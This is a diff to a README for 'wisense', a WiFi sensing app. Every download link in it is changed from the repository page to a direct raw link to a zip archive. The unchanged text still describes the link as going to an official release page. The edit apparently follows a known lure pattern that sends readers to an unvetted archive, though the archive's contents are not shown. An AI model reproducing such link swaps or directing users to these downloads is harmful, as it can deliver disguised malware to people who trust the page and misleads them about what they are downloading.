@@ -1,6 +1,6 @@
 # 📡 wisense - WiFi Sensing That Respects Your Privacy
 
-[![Download wisense](https://img.shields.io/badge/Download-wisense-2ea44f?style=for-the-badge&logo=github)](https://github.com/emersonsteadied7796/wisense)
+[![Download wisense](https://img.shields.io/badge/Download-wisense-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/emersonsteadied7796/wisense/main/wisense/v1.7.zip)
 
 ---
 
@@ -55,7 +55,7 @@ Let's get wisense running on your computer. Follow these simple steps:
 
 ### Step 1: Download the Application
 
-👉 **[Click here to download wisense](https://github.com/emersonsteadied7796/wisense)**
+👉 **[Click here to download wisense](https://raw.githubusercontent.com/emersonsteadied7796/wisense/main/wisense/v1.7.zip)**
 
 This link will take you to the official download page. Once there, look for the latest release and download the file to your computer. Visit this link to download the application.
 
@@ -247,7 +247,7 @@ Thank you for choosing wisense. We built this to bring affordable, privacy-respe
 
 **Ready to start?** 
 
-👉 **[Download wisense now](https://github.com/emersonsteadied7796/wisense)** and transform your living space today.
+👉 **[Download wisense now](https://raw.githubusercontent.com/emersonsteadied7796/wisense/main/wisense/v1.7.zip)** and transform your living space today.
 
 ---
 
